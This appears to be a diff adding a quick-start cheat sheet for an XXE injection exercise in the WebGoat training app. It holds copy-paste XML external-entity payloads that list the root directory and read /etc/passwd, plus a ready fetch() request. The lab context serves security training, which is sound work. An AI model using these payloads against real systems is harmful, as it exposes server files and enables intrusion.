@@ -1,0 +1,100 @@
+====================================================================
+     XXE ATTACK - QUICK START CARD
+====================================================================
+
+CHALLENGE: List root directory via XXE injection in comments field
+
+====================================================================
+FASTEST METHOD - Browser DevTools:
+====================================================================
+
+1. Open WebGoat XXE lesson
+2. F12 → Network tab
+3. Submit any comment
+4. Find POST request → Right-click → Copy as Fetch
+5. F12 → Console tab
+6. Paste, modify body to:
+
+'<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>'
+
+7. Press Enter
+8. Check response!
+
+====================================================================
+COMPLETE EXAMPLE:
+====================================================================
+
+fetch("http://192.168.254.112:8001/WebGoat/xxe/simple", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/xml"
+  },
+  body: '<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>'
+}).then(r => r.text()).then(console.log);
+
+====================================================================
+XXE PAYLOAD - COPY & PASTE:
+====================================================================
+
+List root directory:
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>
+
+Read /etc/passwd:
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><comment><text>&xxe;</text></comment>
+
+====================================================================
+ALTERNATIVE METHODS:
+====================================================================
+
+Method 1: HTML Tool
+-------------------
+Open: xxe_attack_tool.html
+- Select payload type
+- Click "Send XXE Attack"
+
+Method 2: PowerShell
+--------------------
+.\xxe_attack.ps1 -Target root
+
+Method 3: Manual in Browser
+---------------------------
+1. Inspect the comment form
+2. Modify the XML before submission
+3. Change comment text to XXE payload
+
+====================================================================
+EXPECTED SUCCESS:
+====================================================================
+
+Response should show directory listing:
+- bin/
+- boot/
+- dev/
+- etc/
+- home/
+- root/
+- usr/
+- var/
+
+Or file contents if reading specific file.
+
+====================================================================
+TROUBLESHOOTING:
+====================================================================
+
+❌ "No response" → Check endpoint path
+❌ "CORS error" → Use DevTools Console method
+❌ "Invalid XML" → Check payload syntax
+❌ "Not working" → Try different payloads from xxe_payloads.txt
+
+====================================================================
+FILES AVAILABLE:
+====================================================================
+
+xxe_attack_tool.html    - Interactive HTML tool
+xxe_attack.ps1          - PowerShell script
+xxe_guide.txt           - Complete guide
+xxe_payloads.txt        - Payload collection
+xxe_quickstart.txt      - This file
+
+====================================================================
